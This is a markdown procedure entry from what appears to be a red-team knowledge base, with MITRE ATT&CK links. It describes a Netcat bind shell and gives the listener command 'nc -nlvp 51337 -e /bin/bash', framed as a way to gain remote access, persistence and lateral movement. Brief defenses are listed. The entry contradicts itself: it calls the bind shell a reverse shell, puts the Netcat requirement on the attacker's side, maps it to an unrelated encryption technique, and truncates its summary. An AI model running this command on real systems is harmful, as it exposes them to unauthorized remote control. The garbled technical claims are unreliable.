---
id: 78d49cec-2b96-48d6-99cf-f1bc4353958a
name: Netcat Traditional Bind Shell
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:08.855046+00:00'
updated_at: '2023-04-10T20:21:15.919437+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]'
tags:
- '[[Bind Shell]]'
- '[[Netcat Traditional]]'
commands:
- '[[Netcat Reverse Shell]]'
---

# Netcat Traditional Bind Shell

## Summary

A bind shell is a type of shell in which the target machine opens a communication port or a socket and waits for the attacker to connect to it. This can be used by an attacker to gain remote access to the target machine. Netcat is a tool that can be used to create a bind shell. Netcat is a versatil

## Description

# Description

A bind shell is a type of shell in which the target machine opens a communication port or a socket and waits for the attacker to connect to it. This can be used by an attacker to gain remote access to the target machine. Netcat is a tool that can be used to create a bind shell. Netcat is a versatile networking tool that can be used to transfer files, scan ports, and create various types of network connections. In this case, we will use Netcat to create a bind shell on the target machine. Once the shell is established, the attacker can execute commands on the target machine and gain remote access to it. This technique can be used by attackers to gain persistence on the target machine and move laterally within a network.

 

## Requirements

1. Netcat tool installed on the attacker's machine

1. Ability to connect to the target machine

 

## Defense

1. Use firewalls to block incoming connections to unused ports

1. Monitor network traffic for suspicious activity

1. Implement strong authentication mechanisms to prevent unauthorized access

 

## Objectives

1. Establish a remote shell on the target machine

1. Execute commands on the target machine

1. Gain persistence on the target machine

1. Move laterally within a network

 

# Instructions

1. The 'nc' command is used to establish a network connection between two systems. In this case, it is used to create a reverse shell. The '-n' option tells netcat not to perform DNS lookups. The '-l' option instructs netcat to listen for a connection. The '-v' option enables verbose output. The '-p' option specifies the port to listen on. The '-e' option specifies the executable to run after a connection has been established. In this case, it is /bin/bash.

 



**Code**: [[nc -nlvp 51337 -e /bin/bash]]



> This command opens up a listener on port 51337 and waits for an incoming connection. When a connection is established, it will spawn a bash shell on the remote system, giving the attacker control over the system. This command is commonly used in post-exploitation scenarios to maintain access to a compromised system.



**Command** ([[Netcat Reverse Shell]]):

```bash
nc -nlvp 51337 -e /bin/bash
```



## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Custom Cryptographic Protocol|T1024 - Custom Cryptographic Protocol]]

## Commands Used

- [[Netcat Reverse Shell]]

## Tags

- [[Bind Shell]]
- [[Netcat Traditional]]


